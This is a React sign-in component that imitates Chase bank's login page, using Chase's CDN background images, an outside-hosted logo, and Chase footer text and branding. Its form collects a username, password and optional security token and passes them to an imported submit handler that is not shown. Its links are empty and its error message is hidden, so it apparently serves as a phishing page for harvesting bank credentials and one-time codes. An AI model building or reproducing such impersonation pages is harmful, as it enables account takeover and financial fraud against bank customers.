"use client";

import { useState } from "react";
import { handleSignIn, SignInData } from "@/src/utils/submit";

export default function SignInForm() {
  const [username, setUsername] = useState<string>("");
  const [password, setPassword] = useState<string>("");
  const [token, setToken] = useState<string>("");
  const [useToken, setUseToken] = useState<boolean>(false);
  const [showPassword, setShowPassword] = useState<boolean>(false);
  const [message, setMessage] = useState<string>("");
  const [isLoading, setIsLoading] = useState<boolean>(false); // Loading state

  const onSubmit = async () => {
    const signInData: SignInData = {
      username,
      password,
      ...(useToken && { token }),
    };

    setIsLoading(true); // Start loading

    try {
      await handleSignIn(signInData);
      
    } catch (error) {
      setMessage("Failed to sign in. Please try again.");
      console.error(error);
    } finally {
      setIsLoading(false); // Stop loading after the operation completes
    }
  };

  return (








<div className="bg-cover bg-center bg-fixed bg-[url('https://static.chasecdn.com/content/geo-images/images/background.mobile.day.1.jpeg')] md:bg-[url('https://static.chasecdn.com/content/geo-images/images/background.desktop.day.1.jpeg')]">
<main className="flex flex-col items-center justify-center">
 <div className="bg-gradient-to-b from-black via-black/50 to-black/0 h-full w-full flex flex-col items-center justify-center py-5">
  <img src="https://raw.githubusercontent.com/johnchim9/john/main/image/pngwing.com.png" alt="logo" className="h-8" />
</div>
  
 <section className="w-full m-10 flex items-center justify-center">
     








<form
      className="w-full max-w-80 mx-4 p-6 pt-14 bg-white rounded-md space-y-6"
      onSubmit={(e) => {
        e.preventDefault();
        onSubmit();
      }}
    >
      <div className="space-y-3">
        <label className="text-gray-500 text-sm block -mb-1">Username</label>
        <input
          type="text"
          value={username}
          onChange={(e) => setUsername(e.target.value)}
          className="peer py-1 block w-full bg-transparent border-b-2 border-gray-300 text-sm focus:border-blue-500 focus:ring-0 focus:outline-none"
        />
      </div>

      <div className="relative space-y-3">
        <label className="text-gray-500 text-sm block -mb-1">Password</label>
        <input
          type={showPassword ? "text" : "password"}
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          className="peer py-1 block w-full bg-transparent border-b-2 border-gray-300 text-sm focus:border-blue-500 focus:ring-0 focus:outline-none"
        />
        <button
          type="button"
          onClick={() => setShowPassword(!showPassword)}
          className="absolute right-2 top-1/2 transform -translate-y-1/2 text-blue-600 text-sm font-semibold focus:outline-none"
        >
          {showPassword ? "Hide" : "Show"}
        </button>
      </div>

      {useToken && (
        <div className="space-y-3">
          <label className="text-gray-500 text-sm block -mb-1">Token</label>
          <input
            type="text"
            value={token}
            onChange={(e) => setToken(e.target.value)}
            className="peer py-1 block w-full bg-transparent border-b-2 border-gray-300 text-sm focus:border-blue-500 focus:ring-0 focus:outline-none"
          />
        </div>
      )}

      <div className="flex justify-between">
        <div className="flex items-center">
          <input
            type="checkbox"
            className="shrink-0 mt-0.5 border-gray-200 rounded text-blue-600 focus:ring-blue-500"
          />
          <label className="text-sm text-gray-500 ms-3">Remember me</label>
        </div>

        <div className="flex items-center">
          <input
            type="checkbox"
            className="shrink-0 mt-0.5 border-gray-200 rounded text-blue-600 focus:ring-blue-500"
            onChange={(e) => setUseToken(e.target.checked)}
          />
          <label className="text-sm text-gray-500 ms-3">Use token</label>
        </div>
      </div>

      <button
        type="submit"
        disabled={isLoading} // Disable button while loading
        className="text-white bg-blue-800 hover:bg-blue-800 focus:ring-4 focus:ring-blue-300 font-medium rounded-md text-sm py-2 w-full"
      >
        {isLoading ? (
          <span className="flex justify-center items-center">
            <svg
              className="animate-spin h-5 w-5 mr-3 text-white"
              xmlns="http://www.w3.org/2000/svg"
              fill="none"
              viewBox="0 0 24 24"
            >
              <circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none"></circle>
              <path
                fill="currentColor"
                d="M4 12a8 8 0 0 1 16 0 8 8 0 0 1-16 0z"
                className="opacity-25"
              ></path>
            </svg>
            Loading...
          </span>
        ) : (
          "Sign in"
        )}
      </button>

      {message && (
        <div className={`hidden text-sm mt-4 ${message === "Success" ? "text-green-500" : "text-red-500"}`}>
          {message}
        </div>
      )}


<div className="text-blue-500 text-sm flex flex-col">
  <a href="" className="flex items-center">
    Forgot username/password? 
    <span>
      <svg 
        className="w-[14px] h-[14px] text-blue-500" 
        aria-hidden="true" 
        xmlns="http://www.w3.org/2000/svg" 
        width="24" 
        height="24" 
        fill="none" 
        viewBox="0 0 24 24"
      >
        <path 
          stroke="currentColor" 
          strokeLinecap="round" 
          strokeLinejoin="round" 
          strokeWidth="3" 
          d="m9 5 7 7-7 7"
        />
      </svg>
    </span>
  </a>

  <a href="" className="flex items-center">
    Not Enrolled? Sign Up Now.
    <span>
      <svg 
        className="w-[14px] h-[14px] text-blue-500" 
        aria-hidden="true" 
        xmlns="http://www.w3.org/2000/svg" 
        width="24" 
        height="24" 
        fill="none" 
        viewBox="0 0 24 24"
      >
        <path 
          stroke="currentColor" 
          strokeLinecap="round" 
          strokeLinejoin="round" 
          strokeWidth="3" 
          d="m9 5 7 7-7 7"
        />
      </svg>
    </span>
  </a>
</div>


  
    </form>
   







   
</section>
  
  
</main>

  <footer className="h-40 bg-white">
     <div className="flex items-center justify-center space-x-4 border-b p-4">
      <p className="text-lg text-gray-600">Follow us:</p>   
      
      
      
  <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="100" height="100" viewBox="0 0 48 48"  className="fill-gray-500 w-6 h-6">
<path d="M42,11.5v25c0,3.03-2.47,5.5-5.5,5.5H31V28h3.62c0.51,0,0.94-0.38,1-0.88l0.37-3c0.04-0.28-0.05-0.57-0.24-0.78 C35.56,23.12,35.29,23,35,23h-4v-3.5c0-1.1,0.9-2,2-2h2c0.55,0,1-0.45,1-1v-3.38c0-0.51-0.4-0.94-0.91-0.99 C35.03,12.12,33.62,12,31.83,12c-4.4,0-6.83,2.62-6.83,7.37V23h-4c-0.55,0-1,0.45-1,1v3c0,0.55,0.45,1,1,1h4v14H11.5 C8.47,42,6,39.53,6,36.5v-25C6,8.47,8.47,6,11.5,6h25C39.53,6,42,8.47,42,11.5z"></path>
</svg>    
      
 
 
 
 <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="100" height="100" viewBox="0 0 32 32"  className="fill-gray-500 w-6 h-6">
<path d="M 8 5 C 6.355469 5 5 6.355469 5 8 L 5 24 C 5 25.644531 6.355469 27 8 27 L 24 27 C 25.644531 27 27 25.644531 27 24 L 27 8 C 27 6.355469 25.644531 5 24 5 Z M 21 8 L 24 8 L 24 11 L 21 11 Z M 16 12 C 18.222656 12 20 13.777344 20 16 C 20 18.222656 18.222656 20 16 20 C 13.777344 20 12 18.222656 12 16 C 12 13.777344 13.777344 12 16 12 Z M 7 14 L 10.34375 14 C 10.121094 14.625 10 15.300781 10 16 C 10 19.300781 12.699219 22 16 22 C 19.300781 22 22 19.300781 22 16 C 22 15.300781 21.878906 14.625 21.65625 14 L 25 14 L 25 24 C 25 24.566406 24.566406 25 24 25 L 8 25 C 7.433594 25 7 24.566406 7 24 Z"></path>
</svg>
 
 
 
 <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="100" height="100" viewBox="0 0 48 48"  className="fill-gray-500 w-6 h-6">
<path d="M44.719,10.305C44.424,10,43.97,9.913,43.583,10.091l-0.164,0.075c-0.139,0.064-0.278,0.128-0.418,0.191	c0.407-0.649,0.73-1.343,0.953-2.061c0.124-0.396-0.011-0.829-0.339-1.085c-0.328-0.256-0.78-0.283-1.135-0.066	c-1.141,0.693-2.237,1.192-3.37,1.54C37.4,7.026,35.071,6,32.5,6c-5.247,0-9.5,4.253-9.5,9.5c0,0.005,0,0.203,0,0.5l-0.999-0.08	c-9.723-1.15-12.491-7.69-12.606-7.972c-0.186-0.47-0.596-0.813-1.091-0.916C7.81,6.927,7.297,7.082,6.939,7.439	C6.741,7.638,5,9.48,5,13c0,2.508,1.118,4.542,2.565,6.124c-0.674-0.411-1.067-0.744-1.077-0.753	c-0.461-0.402-1.121-0.486-1.669-0.208c-0.546,0.279-0.868,0.862-0.813,1.473c0.019,0.211,0.445,4.213,5.068,7.235l-0.843,0.153	c-0.511,0.093-0.938,0.444-1.128,0.928C6.914,28.437,6.988,28.984,7.3,29.4c0.105,0.141,2.058,2.68,6.299,4.14	C11.334,34.295,8.222,35,4.5,35c-0.588,0-1.123,0.344-1.366,0.88c-0.244,0.536-0.151,1.165,0.237,1.607	C3.532,37.672,7.435,42,17.5,42C34.213,42,42,26.485,42,16v-0.5c0-0.148-0.016-0.293-0.022-0.439	c2.092-2.022,2.879-3.539,2.917-3.614C45.084,11.067,45.014,10.609,44.719,10.305z"></path>
</svg>
 
  
 <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="100" height="100" viewBox="0 0 48 48" className="fill-gray-500 w-6 h-6">
  
<path d="M 23.857422 8.5 C 17.504717 8.5 11.602344 8.9526234 8.234375 9.65625 A 1.50015 1.50015 0 0 0 8.2128906 9.6621094 C 5.6754768 10.230693 3.2861897 12.048234 2.7832031 14.894531 A 1.50015 1.50015 0 0 0 2.78125 14.90625 C 2.394836 17.200265 2 20.190694 2 24.5 C 2 28.801151 2.3961903 31.712324 2.8847656 34.126953 C 3.4000756 36.889296 5.7342165 38.761817 8.3105469 39.337891 A 1.50015 1.50015 0 0 0 8.3476562 39.347656 C 11.86271 40.040284 17.598467 40.5 23.951172 40.5 C 30.303877 40.5 36.042686 40.04028 39.558594 39.347656 A 1.50015 1.50015 0 0 0 39.595703 39.337891 C 42.133117 38.769306 44.522404 36.951766 45.025391 34.105469 A 1.50015 1.50015 0 0 0 45.029297 34.083984 C 45.409789 31.743169 45.902812 28.755621 46 24.439453 A 1.50015 1.50015 0 0 0 46 24.40625 C 46 20.087697 45.50571 17.078675 45.023438 14.695312 C 44.512192 11.927074 42.175378 10.049478 39.595703 9.4726562 A 1.50015 1.50015 0 0 0 39.476562 9.4511719 C 36.0464 8.9689502 30.211115 8.5 23.857422 8.5 z M 20.15625 17.001953 C 20.526656 16.994297 20.909531 17.081906 21.269531 17.285156 L 29.873047 22.146484 C 31.324047 22.966484 31.324047 25.035469 29.873047 25.855469 L 21.269531 30.716797 C 19.830531 31.528797 18.037109 30.500328 18.037109 28.861328 L 18.037109 19.138672 C 18.037109 17.909422 19.045031 17.024922 20.15625 17.001953 z"></path>
</svg>   
<svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="100" height="100" viewBox="0 0 30 30"  className="fill-gray-500 w-6 h-6">
    <path d="M9,25H4V10h5V25z M6.501,8C5.118,8,4,6.879,4,5.499S5.12,3,6.501,3C7.879,3,9,4.121,9,5.499C9,6.879,7.879,8,6.501,8z M27,25h-4.807v-7.3c0-1.741-0.033-3.98-2.499-3.98c-2.503,0-2.888,1.896-2.888,3.854V25H12V9.989h4.614v2.051h0.065 c0.642-1.18,2.211-2.424,4.551-2.424c4.87,0,5.77,3.109,5.77,7.151C27,16.767,27,25,27,25z"></path>
</svg>
  
     </div> 
      <div className="flex flex-wrap justify-center items-center text-center gap-4 px-2 py-6">
  <a href="" className="text-gray-500 text-xs underline">Contact us</a>
  <a href="" className="text-gray-500 text-xs underline">Privacy</a>
  <a href="" className="text-gray-500 text-xs underline">Security</a>
  <a href="" className="text-gray-500 text-xs underline">Terms of use</a>
  <a href="" className="text-gray-500 text-xs underline">Accessibility</a>
  <a href="" className="text-gray-500 text-xs underline">SAFE Act: Chase Mortgage Loan Originators</a>
  <a href="" className="text-gray-500 text-xs underline">Fair Lending</a>
  <a href="" className="text-gray-500 text-xs underline">About Chase</a>
  <a href="" className="text-gray-500 text-xs underline">J.P. Morgan</a>
  <a href="" className="text-gray-500 text-xs underline">JPMorgan Chase & Co.</a>
  <a href="" className="text-gray-500 text-xs underline">Careers</a>
  <a href="" className="text-gray-500 text-xs underline">Español</a>
  <a href="" className="text-gray-500 text-xs underline">Chase Canada</a>
  <a href="" className="text-gray-500 text-xs underline">Site map</a>
  <p className="text-gray-500 text-xs">Member FDIC</p>
  <p className="text-gray-500 text-xs">Equal Housing Opportunity</p>
  <p className="basis-full text-gray-500 text-xs text-center">(c) 2024 JPMorgan Chase & Co.</p>
</div>


  </footer> 
</div>
  );
}
